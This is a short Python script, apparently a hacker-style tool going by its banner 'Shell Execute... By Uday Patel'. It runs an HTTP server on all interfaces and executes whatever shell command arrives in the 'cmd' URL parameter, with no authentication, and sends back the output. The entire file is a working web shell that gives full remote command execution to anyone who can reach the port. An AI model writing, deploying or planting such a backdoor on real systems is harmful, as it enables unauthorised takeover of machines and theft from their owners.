#!/usr/bin/env python3
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
import subprocess
import sys

class CommandExecutorHTTPServer(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        command = urllib.parse.parse_qs(parsed_url.query).get('cmd', [''])[0]
        try:
            command_output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            self.send_response(200)
        except subprocess.CalledProcessError as error:
            command_output = f"Error: {error.output}"
            self.send_response(500)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(command_output.encode())

def run_server(port):
    server_address = ('', port)
    httpd = HTTPServer(server_address, CommandExecutorHTTPServer)
    print(f"Server started on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    print("Shell Execute..........[+] By Uday Patel")
    if len(sys.argv) < 2:
        print("Usage: python3 server.py <port>")
        sys.exit(1)
    port = int(sys.argv[1])
    run_server(port)